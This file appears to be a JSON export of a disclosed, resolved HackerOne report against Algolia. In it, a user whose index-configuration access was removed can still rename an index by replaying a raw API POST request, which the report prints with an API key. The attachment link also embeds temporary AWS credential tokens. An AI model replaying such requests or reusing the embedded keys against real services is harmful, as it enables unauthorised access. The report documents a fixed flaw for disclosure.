@@ -1,0 +1,142 @@
+{
+  "id": 99969,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85OTk2OQ==",
+  "url": "https://hackerone.com/reports/99969",
+  "title": "User with limited access to Index configuration can rename the Index",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-11-16T15:17:26.720Z",
+  "submitted_at": "2015-11-16T15:17:26.720Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bugs3ra",
+    "url": "/bugs3ra",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/031/877/979f1b2f975110612d4cab7336f0d594e4afb678_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 443,
+    "url": "https://hackerone.com/algolia",
+    "handle": "algolia",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Algolia",
+      "twitter_handle": "algolia",
+      "website": "https://algolia.com",
+      "about": "Hosted search API that delivers instant and relevant results from the first keystroke"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-06-01T10:16:55.411Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-05-02T10:16:44.286Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "HI,\n\nI just noticed that user with limited access to any index can still rename it by replaying the old request after changing some values in the post request.\n\nSteps:\n1. Invite user to your application.\n2. Give User full access.\n3. Now login the invited account, and create an index.\n4. Go back to admin account and remove the access to configure index.\n5. On Invited account, all index configuration options will disappear.\n6. Post the following request.\n\nPOST /1/indexes/<index name>/operation?x-algolia-api-key=395d4963afcdba0c00f4e8847459a8fd&x-algolia-application-id=JC6IO59O0A&x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.7.5 HTTP/1.1\nHost: c1-in-2.algolianet.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://www.algolia.com/explorer\nContent-Length: 39\nOrigin: https://www.algolia.com\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\n{\"operation\":\"move\",\"destination\":\"put index name here\"}\n\n7. Now reload the page, U'll notice the index will be having new name.\n\nI guess,  other changes can also be made like deleting or adding objects to this index.",
+  "bounty_amount": "200.0",
+  "formatted_bounty": "$200",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 62035,
+      "file_name": "Index_Rename.webm",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/062/035/19e4d1d48d8ca7b285611fca4c6713629a22888b/Index_Rename.webm?response-content-disposition=attachment%3B%20filename%3D%22Index_Rename.webm%22%3B%20filename%2A%3DUTF-8%27%27Index_Rename.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXR3XQUV4%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T124225Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB7LDelnFv1qlEk7XkUfZqBe1tjZ6gvDn48rshuY6I3PAiEA73I6%2B62oHc4SDDfnlfqiMEw1AiIKFgVQ2Q6ugMIwHPMqugUInP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLqTdqXmycsJ79XKxSqOBUD9MNFkAKemLgMh0GgbSiHVw4i09YHJ2LVIZd4Y%2B5Ck%2BUAA8fDAmS%2FAZ7ARWA%2FqNJC3tMDycPkLeCEmtaZs31MGNmBlCn6%2FeIXgFFa2DI2V2ctggVDLn%2Bpa5tQyE3IMqiOpJTeEH7r4GeypPLjZv9%2FoKKru6GRdbpIN0cHXiqRyLVg5kUemG%2FXUzRxUnxxo9k1y61L1GghqUHpeb%2FUf%2B8v4VID%2FqHgfbkeWJK9VBfJDN89BOpKvZQ7Q7SaWf2Z%2BUe6muL8wgX5KtguU7yxpeeZXaVJgmnYQh5LX3awLDne%2FxjF4PPW0KGL1spimQF0c9pfCNx2xolgzSDvBUEzzLgS5un9bIlLGEuvDvhqkK4oFU23oi051vp35zCViV6TnOGWW6VVLp%2FDWyOGNYvzZ1%2BWqMvZq5hogZeG5%2FPDiJKA%2FHlJNEY%2BPTts%2FKP3N4nU5gtOr%2B7GcxCZfCFDoeZIaEbwz2RnvocsiNIG%2BWF%2FgVlRMZsRdWNc3Hf3iombBsI95n3cAHI57JpnK7gS7eqAPQa8bu1CEUHsJWocbiBtMFrrIvxCdigQcm2lN5aRCli2l%2B4sPtANsOQaP4Ym7VjbXJwV2Sq7kaOGKTgBw0iPVfUrZL280WDfbbc%2Fv6eZkvOj41ZQJpgermq93NheAzUeZMBAcl4K9Nwt2TVUl8tjfGIIEpv9cZ10GKNcyQ0N2%2BXbyY5ozKsF4tfpIZxdQMkqiN1Qt5euLAxyMZoGdMUTHE1rpcYe%2FWJfeRwO%2BCWnKQ5y3elC4jnJldCRsLA%2FyuDK%2F9z%2BiQ%2FyCZQcNITdg42Sj34h1o7AxqisgoQNLqDhZTxeZ%2FgGPxKVuNLv9yrq4REVUwRcTXEkINMBp0XIlUmZhejDpk5XRBjqxAYDkPtdGzNnr4A3Lxgf2KGA80FQ7T7rAJlTYPgcbGhHBRfOLlUk%2BTgzeISOYppIW59sclgbIp1CtnB%2FaROVY9f%2F%2FS9HgZeCoiO%2BlI5v8A3tPe6qhRwYm0jWqfFWEursoAxpuW3cHEj5OU99mCFP2r%2FGmfGdXpY9qx0AqyTtBaMDW3MM7OrWmjyIXvMrUpvrdaMfeV1wnWINQGSgihGXsK%2B4HzF%2Bzk9U8U7u0ZZgQUfgJLQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1876144f5c16215edc3006b1c5e1f8f7e8ffac18bb71358e3d5ca3c080dd37e8",
+      "file_size": 2544232,
+      "type": "video/webm",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-06-01T10:16:44.360Z",
+  "allow_singular_disclosure_after": -316059941.5786039,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "shivammusic",
+    "dyabla",
+    "destinedtohack"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 1028,
+      "category": "researcher",
+      "content": "Privilege escalation Issue when User privilege is changed from Full access to limited access. The changes doesn't apply resulting ACL to API keys",
+      "updated_at": "2015-11-16T16:55:35.930Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 31877,
+        "username": "bugs3ra",
+        "name": "Vijay Chaudhary",
+        "bio": "Just to learn new stuff here...",
+        "cleared": false,
+        "verified": false,
+        "website": "http://www.youtube.com/user/learnsecurityvideos",
+        "location": "Delhi, India",
+        "created_at": "2015-05-28T14:14:11.634Z",
+        "url": "https://hackerone.com/bugs3ra",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/031/877/979f1b2f975110612d4cab7336f0d594e4afb678_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/031/877/979f1b2f975110612d4cab7336f0d594e4afb678_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/031/877/979f1b2f975110612d4cab7336f0d594e4afb678_original.png/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    }
+  ]
+}
